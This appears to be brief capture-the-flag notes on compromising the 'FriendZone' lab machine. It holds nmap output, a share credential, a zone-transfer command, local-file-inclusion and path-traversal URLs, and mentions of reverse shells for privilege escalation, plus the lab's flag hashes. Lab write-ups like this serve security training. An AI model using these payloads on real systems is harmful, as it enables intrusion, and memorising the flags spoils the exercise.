# Enumeration
## Nmap
```bash
nmap -sC -sV -oA nmap/friendzone 10.10.10.123

PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 3.0.3
22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 a96824bc971f1e54a58045e74cd9aaa0 (RSA)
|   256 e5440146ee7abb7ce91acb14999e2b8e (ECDSA)
|_  256 004e1a4f33e8a0de86a6e42a5f84612b (ED25519)
53/tcp  open  domain      ISC BIND 9.11.3-1ubuntu1.2 (Ubuntu Linux)
| dns-nsid: 
|_  bind.version: 9.11.3-1ubuntu1.2-Ubuntu
80/tcp  open  http        Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Friend Zone Escape software
|_http-server-header: Apache/2.4.29 (Ubuntu)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
443/tcp open  ssl/http    Apache httpd 2.4.29
|_ssl-date: TLS randomness does not represent time
|_http-server-header: Apache/2.4.29 (Ubuntu)
| tls-alpn: 
|_  http/1.1
| ssl-cert: Subject: commonName=friendzone.red/organizationName=CODERED/stateOrProvinceName=CODERED/countryName=JO
| Not valid before: 2018-10-05T21:02:30
|_Not valid after:  2018-11-04T21:02:30
|_http-title: 404 Not Found
445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
Service Info: Hosts: FRIENDZONE, 127.0.1.1; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: friendzone
|   NetBIOS computer name: FRIENDZONE\x00
|   Domain name: \x00
|   FQDN: friendzone
|_  System time: 2023-05-12T15:41:38+03:00
|_clock-skew: mean: -1h00m24s, deviation: 1h43m54s, median: -25s
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2023-05-12T12:41:38
|_  start_date: N/A
|_nbstat: NetBIOS name: FRIENDZONE, NetBIOS user: <unknown>, NetBIOS MAC: 000000000000 (Xerox)

```

# SMB
Creds.txt

`creds for admin thing`
```
admin:WORKWORKHhallelujah@#
```

box has dns so try zone transfer.

```
dig axfr @10.10.10.123 friendzone.red
```

This gives an administrator1 vhost which has a login page.

LFI:
```
https://administrator1.friendzone.red/dashboard.php?image_id=none&pagename=php://filter/convert.base64-encode/resource=login
```

upload a shell in the general share and execute it.
```
/etc/general
```

test if it works.
```
<?php
echo("POC");
?>
```

yea it works!
```
https://administrator1.friendzone.red/dashboard.php?image_id=none&pagename=../../../../../etc/Development/test
```

php rev shell.

# Shell as www-data
user.txt:
```
3f50d0e84e68dd21cff1d2863138afc4
```

python script and we can overwrite the module.

pspy shows the script runs as root.

change os to be a rev shell

root.txt
```
652f11f03ae195ee0f8fa99e01a0eecb
```